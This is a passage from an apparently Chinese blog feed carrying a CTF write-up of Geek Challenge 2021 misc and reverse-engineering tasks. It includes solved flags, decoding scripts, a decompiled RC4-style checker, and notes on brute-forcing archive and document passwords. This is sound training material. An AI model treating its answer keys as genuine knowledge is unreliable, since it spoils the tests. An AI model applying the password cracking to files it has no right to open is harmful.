class="hljs-number">50</span>) <span class="hljs-keyword">as</span> t:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>            t.submit(fn, name=<span class="hljs-string">f&quot;进程<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Website Spider</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2021</title>
    <link href="/2022/03/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982021/"/>
    <url>/2022/03/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982021/</url>
    
    <content type="html"><![CDATA[<h2 id="By-Harry0709-Equinox"><strong>By  Harry0709   Equinox</strong></h2><h2 id="Matrix-01-战队"><strong>Matrix - 01 战队</strong></h2><h2 id="Misc"><strong>Misc</strong></h2><h3 id="In-the-Air"><strong>In the Air</strong></h3><p><img src="https://s3.bmp.ovh/imgs/2021/11/120acfefab0c2e68.png" alt=""></p><p>在会场打开手机WiFi就可以得到flag <s>【  救  命  我  手  机  要  没  电  了 】</s></p><h3 id="easysend"><strong>easysend</strong></h3><p><img src="https://static01.imgkr.com/temp/e7121b53f9424865b81950bd7cc2946e.png" alt=""></p><p>按照对应操作完成即可得到 flag</p><h3 id="今天有被破防吗？"><strong>今天有被破防吗？</strong></h3><p>经过对 txt 里的数据分析可以得到一张图片 ：</p><p><img src="https://static01.imgkr.com/temp/92b650f74a3141bb8d1bf4ffd558cd3b.jpg" alt=""></p><p>经过非常非常仔细的观察后，可以发现上面有部分字母，我们通过 QQ 的截图进行拼凑。 <s>（  QQ  打  钱  ）</s></p><p>就可以得到 flag</p><p><strong>注：</strong></p><p>可以通过 Kali 带的拼图功能完成，需要安装相应的库，相关链接<a href="https://blog.csdn.net/m0_47643893/article/details/113778577"> CTF~ImageMagick+gaps=自动拼图-CSDN博客</a></p><p><s>【 要  不  是  我  的  Kali 装  不  上  库 ，而  且  我  忘  记  带  鼠  标  了 ，谁  会  用  QQ  啊 （ b u s h i ）】</s></p><h3 id="easycreat"><strong>easycreat</strong></h3><p>我们根据hint要求部署一个合约，到网上找相应教程进行对应操作就可以了，学习链接：</p><p><code>https://blog.csdn.net/chyabc123456hh/article/details/106950687?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-5.no_search_link&amp;spm=1001.2101.3001.4242.4</code></p><p><img src="https://static01.imgkr.com/temp/5d51d891d71848779de1144eefcf3467.png" alt=""></p><h3 id="这是什么命令"><strong>这是什么命令</strong></h3><p>我们打开题目发现下面有一行 Linux 下的指令我们来简单分析一下：</p><p><img src="https://static01.imgkr.com/temp/931ca959829d4d0598d07f764f7ca8f4.png" alt=""></p><p>首先题目中显示 <code>cat flag.png </code>这个的意思是打开<code>flag.png</code>，接下来的连续两个<code>Base64</code>应该是对这个图片进行两次的<code>Base 64</code>加密，以<code>|</code>进行分割，之后以一个<code>tac</code>对字符进行编号，<code>sort -k 2</code>则是对第二列的值进行排序,之后得到了一个flag.txt。<br>之后以一个<code>rm -f</code>删除了<code>flag.png</code>,并用一个<code>nohubphp -S</code> 开启一个本地的2333端口，将这个<code>txt</code>挂载在 <code>/dev/null</code> 这个端口上。</p><h3 id="说实话挺好玩的，不是吗？"><strong>说实话挺好玩的，不是吗？</strong></h3><p>这个题目拿到手后是一个加密<code>word</code>文档，根据压缩包的注释我们知道有一个8位长度的密码，但是我们不管他，直接爆破（网站：<code>https://rixler.password-find.com/?utm_source=WPRM&amp;utm_medium=IDS_TEXT_STRONG&amp;utm_campaign=rixler</code>)冲它就完事了。之后拿到手的是一个有大片空白的文档 ：</p><p><img src="https://static01.imgkr.com/temp/4b7b878f5b644091b97dfecc7c3a8eff.png" alt=""></p><p>看到一大片空白，我们不难想到<code>SNOW</code>隐写，那么我们可以通过<code>SNOW.EXE</code>直接对其进行解密。</p><p><img src="https://static01.imgkr.com/temp/f9a862bae4df450282b420b1ba53b78e.png" alt=""></p><h3 id="PANDORA-PARADOXXX"><strong>PANDORA PARADOXXX</strong></h3><p>有一说一这个题目挺烦人的，一共对压缩包进行了 4 层加密，第一层是一个伪加密，第二层是一个 6 位字母密码，利用字典可以跑出来，第三层是一个 6 位的数字密码，同样利用字典可以跑出来，最后一层是一个字母密码再次爆破就可以得到<code>Flag</code>。</p><p><img src="https://s3.bmp.ovh/imgs/2021/11/03fcaead9e99329a.png" alt=""></p><h3 id="SAG-Character"><strong>SAG Character</strong></h3><p>又是一个费眼睛的题目~~（ 快 暴 打 S R ）~~，最开始得到这张图，与<code>MC</code>有关，于是我首先想到的是导入自定义皮肤的功能，将图片导入发现不行，于是开始转向内部方块带有这个符号的，在附魔台我们可以发现相同的符号，于是到百度去找对应翻译语言。</p><p><img src="https://bkimg.cdn.bcebos.com/pic/2cf5e0fe9925bc31e096ec7658df8db1ca137011?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2U3Mg==,g_7,xp_5,yp_5/format,f_auto" alt="img"></p><p>在经过翻译之后就可以得到下面的句子 ：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs hxml">congratulations you have mastered the essence of this symbol.<br>恭喜你，你已经掌握了这个符号的本质。<br>the standard galactic alphabetis a writing system used throughout the commander keen series.<br>标准银河系字母表是整个《指挥官》系列中使用的一种书写系统。<br>it is a simple substitution cypher where each letter in the latin alphabet has been substituted with a dierent symbol. <br>这是一个简单的替换式密码，拉丁字母表中的每个字母都被替换成不同的符号。<br>here is your flag am4z1ngsga1ng4m3<br></code></pre></td></tr></table></figure><h3 id="每日一溜"><strong>每日一溜</strong></h3><p>用<code>wireshark</code>打开，发现有很多数据包，我们通过<code>ctrl+f</code>查找常用文件的后缀名，发现<code>png</code>格式下有一张图片，我们以原始数据保存，用010去掉数据包头尾，头删到‰之前，仅保留png的数据，打开得到一张图片，猜测又是一个图片隐写，<code>binwalk</code>先分析一下，没有东西，拖入<code>010Editor</code>中发现存在<code>rar</code>的标识，于是我们转换图片为<code>rar</code>，发现里面后两个<code>Base64</code>编码的数据，第一个按标准的<code>Base 64</code>求解发现无法得到对应的数据（ 解出来乱码 ），但是在第二个<code>Base 64</code>上发现解出来像是一个<code>Base 64</code>的码表，因此我们猜测第一个是一个换表的<code>Base 64</code>，按照解出来的码表对第一个<code>Base 64</code>进行解密便可以得到对应的<code>Flag</code>。</p><h2 id="Re"><strong>Re</strong></h2><h3 id="Re0"><strong>Re0</strong></h3><p><img src="https://static01.imgkr.com/temp/35587fea111c427fabfaf9ceb0e72585.png" alt=""></p><p>打开ida搜索字符串就可以得到flag</p><h3 id="调试"><strong>调试</strong></h3><p>打开Ida，对里面程序进行分析，在<code>start</code>函数里我们发现 v3 赋值给 v5出现了问题，我们跳转到对应的区域，我们先分析 v4 赋值的过程，可以看到有一个跳转指令，我们尝试着改成 jz ，再运行看看。<br><img src="https://static01.imgkr.com/temp/7f639880e362489989c2413fe7eec5ce.png" alt=""></p><p>可以看到程序已经发生了改变：</p><p><img src="https://static01.imgkr.com/temp/ac09642d11164774a29f8ae45532ff8e.png" alt=""></p><p>这个时候我们经过动调可以，观察发现这个程序是一个自解密程序，我们再Linux下进行调试就可以得到flag。</p><p>如下图：</p><p><img src="https://static01.imgkr.com/temp/4929ead896cb47a894a2272adf080366.png" alt=""></p><h3 id="刘壮桌面美化大师"><strong>刘壮桌面美化大师</strong></h3><p><img src="https://static01.imgkr.com/temp/0b6ff5bdfbb548778fc1b731715af3ad.png" alt=""></p><p>直接在字符串里面查找就可以得到 flag 了</p><h3 id="买Activity"><strong>买Activity</strong></h3><p><s>（ 又  是  一  个  安  卓  逆  向  ，我  要  学  废  了  ）</s></p><p>我们借用 jeb 来进行安卓的逆向，打开对应 apk 文件，在茫茫包中发现 Decode 的身影，此时的心难以言表。</p><p><img src="https://static01.imgkr.com/temp/e6428c5ce4d34473a453c19acd3636e9.png" alt=""></p><p>观察一下发现是不是少了一个最重要的 v0 ，v0 的数据是什么呢？在安卓的 so 文件里面我们可以看到有两个字符串，根据 <code>stringfromnative</code>我们猜测这两个字符串便是传给 v0 的值。</p><p><img src="https://static01.imgkr.com/temp/e9e41c341aad4690bb26967006956520.png" alt=""></p><p>有了数据，也有了解码的方式，我们编写一个脚本来帮助我们解题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">str1 = [<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span> ,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;`&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>]<br><span class="hljs-comment">#str1 = [&#x27;I&#x27;,&#x27;k&#x27;,&#x27;x&#x27;,&#x27;c&#x27;,&#x27;$&#x27;,&#x27;d&#x27;,&#x27;F&#x27;,&#x27;d&#x27;,&#x27;O&#x27;,&#x27;C&#x27;,&#x27;B&#x27;,&#x27;q&#x27;,&#x27;!&#x27;,&#x27;O&#x27;,&#x27;h&#x27;,&#x27; &#x27;,&#x27;d&#x27;,&#x27;t&#x27;,&#x27;m&#x27; ]</span><br>v1=<span class="hljs-number">19</span><br>v3=<span class="hljs-number">0</span><br>ans=[]<br><span class="hljs-keyword">while</span> v3&lt;v1 :<br>     v4=<span class="hljs-built_in">ord</span>(str1[v3])<br>     v3+=<span class="hljs-number">1</span><br>     ans.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(v4^<span class="hljs-number">16</span>)))<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><p>分别的运行结果是 <code>['S', 'C', 'T', '1', '_', 'c', '1', 'i', 'y', 'i', '_', '3', 'l', 'y', 'E', 'p', 'r', 'e', '!']</code></p><p><code>['Y', '&#123;', 'h', 's', '4', 't', 'V', 't', '_', 'S', 'R', 'a', '1', '_', 'x', '0', 't', 'd', '&#125;']</code></p><p>我们通过简易的分析可以发现这个是一个栅栏加密，长度为 2，我们将这两个数据放入在线网站进行解密就可以得到我们需要的 flag 了。</p><p><strong>注：</strong></p><p>与某位<strong>SR</strong>的交流过程</p><p><img src="https://static01.imgkr.com/temp/34cf175be59442848dccb9eb80efd9ed.png" alt=""></p><p>我的方法不是很推荐，建议有兴趣的可以去了解一下 <s>（  其  他  方  法  我  不  会  呀  ）</s></p><h3 id="easypyc"><strong>easypyc</strong></h3><p>拿到程序一看，图标有点像一个 Python 打包生成的一个程序 ：</p><p><img src="https://static01.imgkr.com/temp/a92cafa0f61e426f8a0de984d91068d0.png" alt=""></p><p>看了看名字有一个 pyc 那肯定就是 Python 打包的一个程序了。那么我们接下要做的便是对这个 exe 进行拆分得到 pyc 文件</p><p><strong>拆分学习链接：<a href="https://blog.csdn.net/as604049322/article/details/119834495">Pyinstaller打包的exe之一键反编译py脚本与防反编译</a></strong></p><p>在拆分后我们可以得到一个不带后缀的一个 easypyc 文件，我们补上后缀，到对应网站在线反编译 pyc 成 py 可以得到如下的 Python 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># uncompyle6 version 3.5.0</span><br><span class="hljs-comment"># Python bytecode 3.8 (3413)</span><br><span class="hljs-comment"># Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) </span><br><span class="hljs-comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span><br><span class="hljs-comment"># Embedded file name: easypyc.py</span><br><span class="hljs-comment"># Size of source mod 2**32: 272 bytes</span><br>whatbox = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">aaaaaaa</span>(<span class="hljs-params">a, b</span>):</span><br>    k = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br>    t = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        whatbox[m] = m<br>        k[m] = <span class="hljs-built_in">ord</span>(a[(m % b)])<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        t = (t + whatbox[i] + k[i]) % <span class="hljs-number">256</span><br>        temp = whatbox[i]<br>        whatbox[i] = whatbox[t]<br>        whatbox[t] = temp<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bbbbbbbbbb</span>(<span class="hljs-params">a, b</span>):</span><br>    q = <span class="hljs-number">0</span><br>    w = <span class="hljs-number">0</span><br>    e = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b):<br>        q = (q + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        w = (w + whatbox[q]) % <span class="hljs-number">256</span><br>        temp = whatbox[q]<br>        whatbox[q] = whatbox[w]<br>        whatbox[w] = temp<br>        e = (whatbox[q] + whatbox[w]) % <span class="hljs-number">256</span><br>        a[k] = a[k] ^ whatbox[e] ^ <span class="hljs-number">102</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ccccccccc</span>(<span class="hljs-params">a, b</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b):<br>        a[i] ^= a[((i + <span class="hljs-number">1</span>) % b)]<br><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, b):<br>        a[j] ^= a[(j - <span class="hljs-number">1</span>)]<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    kkkkkkk = <span class="hljs-string">&#x27;Geek2021&#x27;</span><br>    tttttt = [<span class="hljs-number">117</span>, <span class="hljs-number">62</span>, <span class="hljs-number">240</span>, <span class="hljs-number">152</span>, <span class="hljs-number">195</span>, <span class="hljs-number">117</span>, <span class="hljs-number">103</span>, <span class="hljs-number">74</span>, <span class="hljs-number">240</span>, <span class="hljs-number">151</span>, <span class="hljs-number">173</span>, <span class="hljs-number">162</span>, <span class="hljs-number">17</span>, <span class="hljs-number">75</span>, <span class="hljs-number">141</span>, <span class="hljs-number">165</span>, <span class="hljs-number">136</span>, <span class="hljs-number">117</span>, <span class="hljs-number">113</span>, <span class="hljs-number">33</span>, <span class="hljs-number">98</span>, <span class="hljs-number">151</span>, <span class="hljs-number">174</span>, <span class="hljs-number">4</span>, <span class="hljs-number">48</span>, <span class="hljs-number">25</span>, <span class="hljs-number">254</span>, <span class="hljs-number">101</span>, <span class="hljs-number">185</span>, <span class="hljs-number">127</span>, <span class="hljs-number">131</span>, <span class="hljs-number">87</span>]<br>    ssss = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please input your flag:&#x27;</span>)<br>    inp = [<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(ssss)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ssss) != <span class="hljs-number">32</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Length Error!!!!&#x27;</span>)<br>        exit(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ssss)):<br>        inp[i] = <span class="hljs-built_in">ord</span>(ssss[i])<br><br>    aaaaaaa(kkkkkkk, <span class="hljs-built_in">len</span>(kkkkkkk))<br>    bbbbbbbbbb(inp, <span class="hljs-number">32</span>)<br>    ccccccccc(inp, <span class="hljs-number">32</span>)<br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        <span class="hljs-keyword">assert</span> <span class="hljs-keyword">not</span> tttttt[m] != inp[m], <span class="hljs-string">&#x27;sorry your flag is wrong&#x27;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;success!!!!!!&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;your flag is &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ssss))<br></code></pre></td></tr></table></figure><p>我们进行简单的修改来测试数据内容以及结构（以下是我的部分测试）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># uncompyle6 version 3.5.0</span><br><span class="hljs-comment"># Python bytecode 3.8 (3413)</span><br><span class="hljs-comment"># Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) </span><br><span class="hljs-comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span><br><span class="hljs-comment"># Embedded file name: easypyc.py</span><br><span class="hljs-comment"># Size of source mod 2**32: 272 bytes</span><br>whatbox =[<span class="hljs-number">41</span>, <span class="hljs-number">244</span>, <span class="hljs-number">181</span>, <span class="hljs-number">212</span>, <span class="hljs-number">184</span>, <span class="hljs-number">237</span>, <span class="hljs-number">95</span>, <span class="hljs-number">117</span>, <span class="hljs-number">193</span>, <span class="hljs-number">26</span>, <span class="hljs-number">137</span>, <span class="hljs-number">126</span>, <span class="hljs-number">65</span>, <span class="hljs-number">122</span>, <span class="hljs-number">239</span>, <span class="hljs-number">250</span>, <span class="hljs-number">214</span>, <span class="hljs-number">112</span>, <span class="hljs-number">62</span>, <span class="hljs-number">207</span>, <span class="hljs-number">240</span>, <span class="hljs-number">227</span>, <span class="hljs-number">120</span>, <span class="hljs-number">48</span>, <span class="hljs-number">36</span>, <span class="hljs-number">148</span>, <span class="hljs-number">234</span>, <span class="hljs-number">150</span>, <span class="hljs-number">228</span>, <span class="hljs-number">165</span>, <span class="hljs-number">129</span>, <span class="hljs-number">174</span>, <span class="hljs-number">56</span>, <span class="hljs-number">190</span>, <span class="hljs-number">46</span>, <span class="hljs-number">127</span>, <span class="hljs-number">49</span>, <span class="hljs-number">43</span>, <span class="hljs-number">245</span>, <span class="hljs-number">130</span>, <span class="hljs-number">114</span>, <span class="hljs-number">34</span>, <span class="hljs-number">202</span>, <span class="hljs-number">27</span>, <span class="hljs-number">131</span>, <span class="hljs-number">224</span>, <span class="hljs-number">64</span>, <span class="hljs-number">160</span>, <span class="hljs-number">50</span>, <span class="hljs-number">153</span>, <span class="hljs-number">157</span>, <span class="hljs-number">206</span>, <span class="hljs-number">52</span>, <span class="hljs-number">91</span>, <span class="hljs-number">225</span>, <span class="hljs-number">58</span>, <span class="hljs-number">176</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">147</span>, <span class="hljs-number">103</span>, <span class="hljs-number">12</span>, <span class="hljs-number">30</span>, <span class="hljs-number">146</span>, <span class="hljs-number">77</span>, <span class="hljs-number">61</span>, <span class="hljs-number">179</span>, <span class="hljs-number">85</span>, <span class="hljs-number">101</span>, <span class="hljs-number">71</span>, <span class="hljs-number">72</span>, <span class="hljs-number">210</span>, <span class="hljs-number">47</span>, <span class="hljs-number">253</span>, <span class="hljs-number">8</span>, <span class="hljs-number">98</span>, <span class="hljs-number">45</span>, <span class="hljs-number">7</span>, <span class="hljs-number">246</span>, <span class="hljs-number">67</span>, <span class="hljs-number">135</span>, <span class="hljs-number">18</span>, <span class="hljs-number">255</span>, <span class="hljs-number">168</span>, <span class="hljs-number">90</span>, <span class="hljs-number">139</span>, <span class="hljs-number">203</span>, <span class="hljs-number">2</span>, <span class="hljs-number">242</span>, <span class="hljs-number">32</span>, <span class="hljs-number">111</span>, <span class="hljs-number">22</span>, <span class="hljs-number">220</span>, <span class="hljs-number">102</span>, <span class="hljs-number">107</span>, <span class="hljs-number">138</span>, <span class="hljs-number">37</span>, <span class="hljs-number">169</span>, <span class="hljs-number">116</span>, <span class="hljs-number">28</span>, <span class="hljs-number">35</span>, <span class="hljs-number">156</span>, <span class="hljs-number">89</span>, <span class="hljs-number">173</span>, <span class="hljs-number">235</span>, <span class="hljs-number">185</span>, <span class="hljs-number">136</span>, <span class="hljs-number">31</span>, <span class="hljs-number">252</span>, <span class="hljs-number">29</span>, <span class="hljs-number">78</span>, <span class="hljs-number">63</span>, <span class="hljs-number">170</span>, <span class="hljs-number">25</span>, <span class="hljs-number">222</span>, <span class="hljs-number">19</span>, <span class="hljs-number">99</span>, <span class="hljs-number">44</span>, <span class="hljs-number">100</span>, <span class="hljs-number">124</span>, <span class="hljs-number">229</span>, <span class="hljs-number">144</span>, <span class="hljs-number">20</span>, <span class="hljs-number">221</span>, <span class="hljs-number">177</span>, <span class="hljs-number">232</span>, <span class="hljs-number">82</span>, <span class="hljs-number">163</span>, <span class="hljs-number">3</span>, <span class="hljs-number">249</span>, <span class="hljs-number">40</span>, <span class="hljs-number">93</span>, <span class="hljs-number">83</span>, <span class="hljs-number">68</span>, <span class="hljs-number">152</span>, <span class="hljs-number">223</span>, <span class="hljs-number">60</span>, <span class="hljs-number">54</span>, <span class="hljs-number">96</span>, <span class="hljs-number">97</span>, <span class="hljs-number">166</span>, <span class="hljs-number">94</span>, <span class="hljs-number">21</span>, <span class="hljs-number">16</span>, <span class="hljs-number">230</span>, <span class="hljs-number">154</span>, <span class="hljs-number">109</span>, <span class="hljs-number">178</span>, <span class="hljs-number">254</span>, <span class="hljs-number">92</span>, <span class="hljs-number">132</span>, <span class="hljs-number">155</span>, <span class="hljs-number">142</span>, <span class="hljs-number">1</span>, <span class="hljs-number">182</span>, <span class="hljs-number">243</span>, <span class="hljs-number">215</span>, <span class="hljs-number">197</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">79</span>, <span class="hljs-number">151</span>, <span class="hljs-number">84</span>, <span class="hljs-number">187</span>, <span class="hljs-number">216</span>, <span class="hljs-number">180</span>, <span class="hljs-number">188</span>, <span class="hljs-number">175</span>, <span class="hljs-number">59</span>, <span class="hljs-number">66</span>, <span class="hljs-number">10</span>, <span class="hljs-number">106</span>, <span class="hljs-number">121</span>, <span class="hljs-number">183</span>, <span class="hljs-number">205</span>, <span class="hljs-number">42</span>, <span class="hljs-number">105</span>, <span class="hljs-number">204</span>, <span class="hljs-number">87</span>, <span class="hljs-number">86</span>, <span class="hljs-number">134</span>, <span class="hljs-number">189</span>, <span class="hljs-number">23</span>, <span class="hljs-number">241</span>, <span class="hljs-number">248</span>, <span class="hljs-number">118</span>, <span class="hljs-number">110</span>, <span class="hljs-number">211</span>, <span class="hljs-number">57</span>, <span class="hljs-number">158</span>, <span class="hljs-number">247</span>, <span class="hljs-number">231</span>, <span class="hljs-number">24</span>, <span class="hljs-number">218</span>, <span class="hljs-number">38</span>, <span class="hljs-number">149</span>, <span class="hljs-number">33</span>, <span class="hljs-number">15</span>, <span class="hljs-number">164</span>, <span class="hljs-number">217</span>, <span class="hljs-number">128</span>, <span class="hljs-number">115</span>, <span class="hljs-number">17</span>, <span class="hljs-number">233</span>, <span class="hljs-number">53</span>, <span class="hljs-number">236</span>, <span class="hljs-number">140</span>, <span class="hljs-number">51</span>, <span class="hljs-number">11</span>, <span class="hljs-number">208</span>, <span class="hljs-number">196</span>, <span class="hljs-number">55</span>, <span class="hljs-number">39</span>, <span class="hljs-number">172</span>, <span class="hljs-number">9</span>, <span class="hljs-number">76</span>, <span class="hljs-number">80</span>, <span class="hljs-number">226</span>, <span class="hljs-number">4</span>, <span class="hljs-number">70</span>, <span class="hljs-number">195</span>, <span class="hljs-number">108</span>, <span class="hljs-number">201</span>, <span class="hljs-number">69</span>, <span class="hljs-number">238</span>, <span class="hljs-number">123</span>, <span class="hljs-number">88</span>, <span class="hljs-number">145</span>, <span class="hljs-number">162</span>, <span class="hljs-number">125</span>, <span class="hljs-number">192</span>, <span class="hljs-number">219</span>, <span class="hljs-number">74</span>, <span class="hljs-number">161</span>, <span class="hljs-number">81</span>, <span class="hljs-number">198</span>, <span class="hljs-number">209</span>, <span class="hljs-number">73</span>, <span class="hljs-number">133</span>, <span class="hljs-number">186</span>, <span class="hljs-number">119</span>, <span class="hljs-number">251</span>, <span class="hljs-number">143</span>, <span class="hljs-number">200</span>, <span class="hljs-number">194</span>, <span class="hljs-number">171</span>, <span class="hljs-number">141</span>, <span class="hljs-number">104</span>, <span class="hljs-number">213</span>, <span class="hljs-number">113</span>, <span class="hljs-number">6</span>, <span class="hljs-number">159</span>, <span class="hljs-number">199</span>, <span class="hljs-number">167</span>, <span class="hljs-number">75</span>, <span class="hljs-number">191</span>]<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">aaaaaaa</span>(<span class="hljs-params">a</span>):</span><span class="hljs-comment">#Geek2021 8</span><br>    k = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br>    t = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):    <br>        whatbox[m] = m      <span class="hljs-comment">#创造256的序列</span><br>        k[m] = <span class="hljs-built_in">ord</span>(a[(m % <span class="hljs-number">8</span>)])  <span class="hljs-comment">#每8个一组Geek2021 一共32组</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        t = (t + whatbox[i] + k[i]) % <span class="hljs-number">256</span><br>        temp = whatbox[i]<br>        whatbox[i] = whatbox[t]<br>        whatbox[t] = temp<br><span class="hljs-comment">#[41, 244, 181, 212, 184, 237, 95, 117, 193, 26, 137, 126, 65, 122, 239, 250, 214, 112, 62, 207, 240, 227, 120, 48, 36, 148, 234, 150, 228, 165, 